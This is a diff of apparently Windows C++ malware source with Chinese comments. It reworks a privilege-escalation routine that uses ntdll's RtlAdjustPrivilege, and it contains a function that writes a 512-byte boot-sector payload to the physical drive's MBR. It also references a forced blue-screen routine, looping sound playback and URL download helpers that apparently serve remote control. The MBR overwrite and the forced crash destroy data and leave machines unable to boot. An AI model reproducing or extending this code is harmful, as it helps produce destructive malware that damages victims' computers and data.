@@ -5,23 +5,12 @@ using namespace std;
 
 bool GetPrivileges()
 {
-	//定义一个PLUID
-	HANDLE hProcess;
-	HANDLE hTokenHandle;
-	TOKEN_PRIVILEGES tp;
-	hProcess = GetCurrentProcess();//获取当前进程的句柄
-
-	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
-	//函数查看系统权限的特权值，返回信息到一个LUID结构体里。
-	tp.PrivilegeCount = 1;
-	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
-	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	bool retn;
-	retn=AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL)==TRUE;
-	CloseHandle(hTokenHandle);
-	CloseHandle(hProcess);
-	if (GetLastError() != ERROR_SUCCESS)
-		return false;
+	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//加载ntdll	
+	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//获取提权函数	
+	BOOLEAN ErrKill;
+	bool retn = false;
+	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//调用RtlAdjustPrivliege函数获取SeShutdownPrivilege权限
+	FreeLibrary(ntdll);
 	return retn;
 }
 
@@ -29,7 +18,7 @@ bool GetPrivileges()
 bool WritePhydriveMBR(unsigned int id,string msgstr)
 {
 	#pragma warning(push)
-	#pragma warning (disable:4309 4838)
+	#pragma warning(disable:4309 4838)
 	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
 	#pragma warning(pop)
 	static bool isfirstuse=true;
@@ -131,10 +120,10 @@ bool MakeBlueScreen(unsigned int errid)
 	return false;
 }
 
-
-void PlaySoundFile(wstring soundname,bool sync)
+//播放声音
+bool PlaySoundFile(wstring soundname,bool sync)
 {
-	PlaySound(soundname.c_str(), NULL, SND_FILENAME | (sync? SND_SYNC :SND_ASYNC) | SND_LOOP);
+	return PlaySound(soundname.c_str(), NULL, SND_FILENAME | SND_NODEFAULT | (sync ? SND_SYNC : SND_ASYNC) | SND_LOOP) == TRUE;
 }
 
 bool DownloadFileFromURL(std::wstring url, std::wstring filepath)
@@ -144,7 +133,7 @@ bool DownloadFileFromURL(std::wstring url, std::wstring filepath)
 
 
 //从URL获取字符串
-std::wstring GetDataFromURL(std::wstring url, bool& iserr)
+std::wstring GetDataFromURL(std::wstring url, bool& isok)
 {
 	CInternetSession session;
 	CHttpFile* file = NULL;
@@ -160,7 +149,7 @@ std::wstring GetDataFromURL(std::wstring url, bool& iserr)
 		m_pException->m_dwError;
 		m_pException->Delete();
 		session.Close();
-		iserr = true;
+		isok = false;
 		return std::wstring();
 	}
 
@@ -181,6 +170,6 @@ std::wstring GetDataFromURL(std::wstring url, bool& iserr)
 	file->Close();
 	delete file;
 	file = NULL;
-	iserr = false;
+	isok = true;
 	return std::wstring(strHtml);
 }
